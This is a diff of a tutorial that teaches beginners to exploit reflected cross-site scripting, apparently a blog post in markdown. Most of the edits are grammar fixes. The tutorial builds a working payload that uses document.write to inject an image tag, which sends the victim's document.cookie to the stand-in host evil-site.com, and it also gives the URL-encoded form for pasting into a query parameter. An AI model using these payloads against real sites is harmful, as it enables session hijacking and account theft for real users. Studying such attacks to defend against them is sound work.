@@ -22,9 +22,9 @@ As an attacker, our goal is to impersonate the server to think we are the *victi
 
 **Let's steal! ;)**
 
-We need `document.cookie` it is a variable that stores cookies of every site you visit individually.
+We need `document.cookie`, it is a variable that stores cookies of every site you visit, individually.
 
-Now we know what we need to include in javascript.
+Now we know what we need to include in the code.
 
 ```html
   <script>alert(document.cookie)</script>
@@ -36,17 +36,13 @@ Voila! We see our cookies in the alert box. You might think this is it. But, whe
 
 the victim sees the cookie and wonder's th!
 
-But, we don't actually have it do we? Now, to actually get the cookie we use a neat idea.
+But, we don't actually have it, do we? Now, to actually get the cookie we use a neat idea.
 
 Let's say we have a evil website `https://evil-site.com`.
-What we try to do is send a request to our evil site with cookies as the user parameter. How?
 
+What we try to do is send a HTTP request to our evil site with cookies in the URL parameter and later retrieve it. But, how?
 
-```html
-<img src=1 onerror="alert(1)">
-```
-
-When we input it, we get `1` as an alert. Now, lets think how are we gonna send cookie to our evil site. What if we sent it using a HTTP Request! 
+What if we sent it using a HTTP Request from an image! 
 
 Like,
 
@@ -54,11 +50,13 @@ Like,
 <img src="https://evil-site.com/cookie?cookie=victim-cookie-here">
 ```
 
-Looks like a  good idea, but how are we gonna attach `document.cookie` in `src` attribute. Thats not possible it doesn't support concatenation.
+Looks like a  good idea, but how are we gonna attach `document.cookie` in `src` attribute. 
+
+That isn't possible as attributes doesn't support string concatenation like **JavaScript**.
 
 Let's think it clearly, we can use `script` tag though!
 
-So lets use `script` tag to put `img` instead
+So lets use `document.write` to output `img` tag instead of putting `img` directly,
 
 ```html
   <script>document.write("<img src='https://evil-site.com/cookie?cookie=" + document.cookie + " '>")</script>
@@ -66,7 +64,7 @@ So lets use `script` tag to put `img` instead
 
 Now, lets paste the above code in the URL query parameter. 
 
-It doesn't work! Wth! What happened? Hmm, it's normal its some proble with how the browser URL works, you must **URL Encode** them before sending them.
+It doesn't work! Wth! What happened? The payload didn't work because of how the browser URL works, you must **URL Encode** them before sending.
 
 `%3Cscript%3Edocument.write%28%22%3Cimg%20src%3D%27https%3A%2F%2Fevil-site.com%2Fcookie%3Fcookie%3D%22%20%2B%20document.cookie%20%2B%20%22%20%27%3E%22%29%3C%2Fscript%3E`
 
